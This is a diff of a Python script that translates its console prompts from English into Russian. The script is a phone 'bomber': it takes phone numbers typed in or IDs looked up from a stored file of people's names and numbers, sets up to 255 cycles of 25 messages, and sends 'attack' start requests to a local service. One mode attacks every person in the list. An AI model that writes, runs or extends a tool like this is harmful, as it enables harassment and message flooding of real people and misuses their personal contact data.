@@ -25,15 +25,15 @@ id_user = None  # временная переменная
 
 def select_mode():  # функция которая задаёт режим
     global MODE
-    mode_select = input("Enter the mode number or HELP for help:")
+    mode_select = input("Введите номер режима или HELP для помощи:")
     if str(mode_select) == "HELP":
-        print("1 – single phone;\n2 – multiple phones;\n3 then 1 – attack on ID;\n4 then 2 – attack all IDs")
+        print("1 – один номер;\n2 – несколько номеров;\n3 и 1 – атака по ID;\n4 и 2 – атака всех ID")
         select_mode()
     else:
         try:
             mode_select = int(mode_select)
         except:
-            print("Invalid input. Are you sure you entered a number or HELP?")
+            print("Неверный ввод. Вы уверены, что ввели номер или HELP?")
             select_mode()
         if int(mode_select) == 1:
             MODE = 1
@@ -42,41 +42,41 @@ def select_mode():  # функция которая задаёт режим
         elif int(mode_select) == 3:  # атака по id
             def hack_me():
                 global MODE
-                hack_all = input("Have you chosen to attack by ID?")
+                hack_all = input("Вы хотите атаковать по ID?")
                 try:
                     hack_all = int(hack_all)
                 except:
-                    print("Invalid input. Are you sure you entered the number?")
+                    print("Неверный ввод. Вы уверены, что ввели число?")
                     hack_me()
                 if str(hack_all) == '1':
                     MODE = 3
                 elif str(hack_all) == '2':
                     MODE = 4
                 else:
-                    print("Invalid input. Are you sure you entered the number 1 or 2?")
+                    print("Неверный ввод. Вы уверены, что ввели цифру 1 или 2?")
                     hack_me()
             hack_me()
         else:
-            print("Invalid input. Are you sure you entered the number 1, 2 or 3?")
+            print("Неверный ввод. Вы уверены, что ввели цифру 1, 2 или 3?")
             select_mode()
 
 
 def select_cycles():
     global NUMBER_OF_CYCLES
-    cycles_select = input("Enter the number of cycles or HELP for help:")
+    cycles_select = input("Введите количество циклов или HELP для помощи:")
     if str(cycles_select) == "HELP":
-        print("1 cycle – 25 messages;\nmaximum = 255 cycles")
+        print("1 цикл – 25 сообщений;\nмаксимум = 255 циклов")
         select_cycles()
     else:
         try:
             cycles_select = int(cycles_select)
         except:
-            print("Invalid input. Are you sure you entered a number or HELP?")
+            print("Неверный Ввод. Вы уверены, что ввели номер или HELP?")
             select_cycles()
         if int(cycles_select) >= 1 and int(cycles_select) <= 255:
             NUMBER_OF_CYCLES = int(cycles_select)
         else:
-            print("Invalid input. Are you sure you entered a number between 1 and 255?")
+            print("Неверный Ввод. Вы уверены, что ввели число от 1 до 255?")
             select_cycles()
 
 
@@ -86,63 +86,63 @@ def phone_check():
     global PHONES
     global number_of_phones
     if MODE == 1:
-        phone_select = input("Enter phone number without 7 or 8:")
+        phone_select = input("Введите номер телефона без 7 или 8:")
         number_of_digits = 0
         for digit in phone_select:
             number_of_digits += 1
         if number_of_digits == 10:
             pass
         else:
-            print("You entered fewer or more numbers or letters")
+            print("Вы ввели меньше или больше цифр или букв")
             phone_check()
         try:
             phone_select = int(phone_select)
         except:
-            print("Invalid input. Are you sure you entered the number?")
+            print("Неверный Ввод. Вы уверены, что ввели число?")
             phone_check()
         PHONE = '7' + str(phone_select)
     elif MODE == 2:
-        number_of_phones = input("Enter the number of phone numbers (no more than 50):")
+        number_of_phones = input("Введите количество телефонных номеров (не более 50):")
         try:
             number_of_phones = int(number_of_phones)
         except:
-            print("Invalid input. Are you sure you entered the number?")
+            print("Неверный Ввод. Вы уверены, что ввели число?")
             phone_check()
         if 1 <= int(number_of_phones) <= 50:
             global PHONES
             for i in range(int(number_of_phones)):
                 please = True
                 while please:
-                    temp_phones = input("Enter phone number " + str(i + 1) + " without 7 or 8:")
+                    temp_phones = input("Введите номер телефона " + str(i + 1) + " без 7 или 8:")
                     number_of_digits_two = 0
                     for digit_two in temp_phones:
                         number_of_digits_two += 1
                     if number_of_digits_two == 10:
                         pass
                     else:
-                        print("You entered fewer or more numbers or letters")
+                        print("Вы ввели меньше или больше цифр или букв")
                         continue
                     try:
                         temp_phones = int(temp_phones)
                     except:
-                        print("Invalid input. Are you sure you entered the number?")
+                        print("Неверный Ввод. Вы уверены, что ввели число?")
                         continue
                     PHONES.append('7' + str(temp_phones))
                     please = False
                     break
         else:
-            print("Invalid input. Are you sure you entered a number between 1 and 50?")
+            print("Неверный Ввод. Вы уверены, что ввели число от 1 до 50?")
     elif MODE == 3:
         global id_user
-        id_user = input("Enter ID:")
+        id_user = input("Введите ID:")
         try:
             id_user = int(id_user)
         except:
-            print("Invalid input. Are you sure you entered the number?")
+            print("Неверный Ввод. Вы уверены, что ввели число?")
             phone_check()
         if int(id_user) >= 1 and int(id_user) <= massa:
-            print("ID: " + str(file_data[int(id_user) - 1]["id"]) + '\nNAME: ' + file_data[int(id_user) - 1]["name"] + '\nPHONE: +' + file_data[int(id_user) - 1]["number"])
-            het = input("Are you sure you want to continue?")
+            print("ID: " + str(file_data[int(id_user) - 1]["id"]) + '\nИМЯ: ' + file_data[int(id_user) - 1]["name"] + '\nТЕЛЕФОН: +' + file_data[int(id_user) - 1]["number"])
+            het = input("Вы хотите продолжить?")
             if het == "YES":
                 PHONE = file_data[int(id_user) - 1]["number"]
             elif het == "NO":
@@ -151,13 +151,13 @@ def phone_check():
                 file.close()
                 quit()
             else:
-                print("ERROR")
+                print("ОШИБКА")
                 phone_check()
         else:
-            print("Invalid input. Are you sure you entered a number from 1 to " + str(massa) + "?")
+            print("Неверный Ввод. Вы уверены, что ввели число от 1 до " + str(massa) + "?")
             phone_check()
     else:
-        het = input("Are you sure you want to continue?")
+        het = input("Вы хотите продолжить?")
         if het == "YES":
             for iter in range(massa):
                 PHONES.append(file_data[iter]["number"])
@@ -167,7 +167,7 @@ def phone_check():
             file.close()
             quit()
         else:
-            print("ERROR")
+            print("ОШИБКА")
             phone_check()
 
 
@@ -193,13 +193,13 @@ if MODE == 1:
     ).json()
 
     if response["success"]:
-        print("ATTACK STARTED")
+        print("АТАКА НАЧАТА")
         id = response["id"]
         response_two = requests.get(
             "http://127.0.0.1:8080/attack/" + id + "/status"
         ).json()
     else:
-        print("Houston, we have a problem")
+        print("ОШИБКА")
 
     if response_two:
         for eter in range(response_two['end_at']):
@@ -207,22 +207,22 @@ if MODE == 1:
                 "http://127.0.0.1:8080/attack/" + id + "/status"
             ).json()
             print(f"{response_three['currently_at']}/{response_three['end_at']}")
-        print("ATTACK ENDED")
+        print("АТАКА ЗАКОНЧЕНА")
 elif MODE == 3:
-    print("Attempt to attack   " + file_data[int(id_user) - 1]["name"] + "   ...")
+    print("Попытка атаковать   " + file_data[int(id_user) - 1]["name"] + "   ...")
     response = requests.post(
         "http://127.0.0.1:8080/attack/start",
         json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONE},
     ).json()
 
     if response["success"]:
-        print("ATTACK STARTED")
+        print("АТАКА НАЧАТА")
         id = response["id"]
         response_two = requests.get(
             "http://127.0.0.1:8080/attack/" + id + "/status"
         ).json()
     else:
-        print("Houston, we have a problem")
+        print("ОШИБКА")
 
     if response_two:
         for eter in range(response_two['end_at']):
@@ -230,7 +230,7 @@ elif MODE == 3:
                 "http://127.0.0.1:8080/attack/" + id + "/status"
             ).json()
             print(f"{response_three['currently_at']}/{response_three['end_at']}")
-        print("ATTACK ENDED")
+        print("АТАКА ЗАКОНЧЕНА")
 elif MODE == 4:
     for e in range(massa):
         response = requests.post(
@@ -244,10 +244,10 @@ elif MODE == 4:
                 "http://127.0.0.1:8080/attack/" + id + "/status"
             ).json()
             if response_two['currently_at'] == response_two['end_at']:
-                print("ATTACK ENDED   " + str(e + 1))
-            print("ATTACK STARTED   " + str(e + 1))
+                print("АТАКА ЗАКОНЧЕНА   " + str(e + 1))
+            print("АТАКА НАЧАТА   " + str(e + 1))
         else:
-            print("Houston, we have a problem " + str(e + 1))  # если обнаружена проблема — написать об это и написать номер
+            print("ОШИБКА " + str(e + 1))  # если обнаружена проблема — написать об это и написать номер
 else:
     for e in range(int(number_of_phones)):
         response = requests.post(
@@ -261,11 +261,11 @@ else:
                 "http://127.0.0.1:8080/attack/" + id + "/status"
             ).json()
             if response_two['currently_at'] == response_two['end_at']:
-                print("ATTACK ENDED   " + str(e + 1))
-            print("ATTACK STARTED   " + str(e + 1))
+                print("АТАКА ЗАКОНЧЕНА   " + str(e + 1))
+            print("АТАКА НАЧАТА   " + str(e + 1))
         else:
-            print("Houston, we have a problem " + str(e + 1))  # если обнаружена проблема — написать об это и написать номер
+            print("ОШИБКА " + str(e + 1))  # если обнаружена проблема — написать об это и написать номер
 # bomb.terminate()
 file.close()
 file_m.close()
-print("\n\n\nThank you for using!")
+print("\n\n\nСпасибо за использование!")
